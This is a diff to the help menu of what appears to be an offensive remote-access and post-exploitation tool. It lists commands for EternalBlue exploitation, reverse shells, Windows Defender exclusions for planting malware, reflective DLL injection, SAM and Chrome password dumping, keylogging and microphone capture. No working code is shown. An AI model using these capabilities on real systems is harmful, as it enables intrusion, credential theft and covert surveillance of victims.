@@ -57,8 +57,10 @@ help = Style.BRIGHT + r"""
 
 HELP
 ----------------------------------
+
 -> Session Core Commands :
 ----------------------------------
+-. help - Print this help message.
 -. show options - View Maalik Attack Options.
 -. show targets - View Scanned Targets.
 -. set target < target > - Set a Target to Attack.*
@@ -69,34 +71,33 @@ HELP
 -. clear_ports - Clear all Ports.
 -. run - Start Pivoting Tunnel.
 -. run autoblue - Automatically runs Eternal Blue on the set Target.
+-. help - Print this help message.
 
-----------------------------------
+
 -> Session Commands :
 ----------------------------------
--. help - Print this help message.
 -. ls - List files in current directory.
 -. cd < dir > - Go in another directory.
--. osinfo - systeminfo output.
 -. delete - delete file.
+-. download - Download file.
+-. upload - Upload file.
+-. osinfo - systeminfo output.
 -. shell - Reverse shell.
--. clientinfo - View basic information of FHDAWN.
+-. clientinfo - View basic information of Fhdawn.
 -. port_scan - Scan for open ports on a Host.
+-. network_scan - Scan the network.
 -. tasklist - View Running Processes.
 -. taskkill - Kill Running Process.
 -. host_sweep - Get all hostnames of scanned targets or specific IP (use -h to specify ip).
--. upload - Upload file.
--. download - Download file.
--. dllinject - Reflective DLL Injection. Load your own DLL.
--. network_scan - Scan the network.
--. (UAC)* windefender_exclude - Add Windows Defender Exclusions.
-    - To Upload Malware, add Exclusion and upload malware to that directory.
+-. dllinject - Reflective DLL Injection. Load your own Reflective DLL.
+-. windefender_exclude - Add Windows Defender Exclusions.
+    - To Upload Malware, add Exclusion and upload malware to that directory, Not recommended uploading to disk. Load Reflective Dll instead.
 -. screenshot - Take Screenshot.
 -. psinfo - Get process information.
 -. isadmin - Check if FHDAWN has administrator rights.
 -. geolocate - Get Geolocation.
 
-----------------------------------
-POST Exploitation
+CMD POST Exploitation Commands :
 ----------------------------------
 -. {cmd} netuser - List users.
 -. {cmd} systeminfo - View full System Information.
@@ -113,14 +114,17 @@ POST Exploitation
 -. {cmd} portfwd - Forward a PORT on the Remote PC.
 -. {cmd} portfwd_reset - Reset all forwarded Ports.
 -. {cmd} samdump - Dump SAM database.
+
+DPS : 
+----------------------------------
 -. {dps} rshell - Netcat Reverse Shell.
--. {dps} bshell - (UAC)* Netcat Bind Shell.
 -. {dps} dropmsf - In Memory Meterpreter.
 -. {dps} runasadmin - Run an application as Administrator.
 -. {dps} chromedump - Dump Google Chrome Passwords.
 -. {dps} keylog_start - Start Capturing keystrokes.
 -. {dps} keylog_stop - Stop Capturing keystrokes, And dump keylogs.
 -. {dps} capturemic - Record microphone.
+
 """.format(dps = Style.BRIGHT  + Fore.GREEN+ "(DPS)" + Style.RESET_ALL , cmd = Style.BRIGHT + Fore.BLUE +"(CMD)" + Style.RESET_ALL)
 
 def clear_screen():
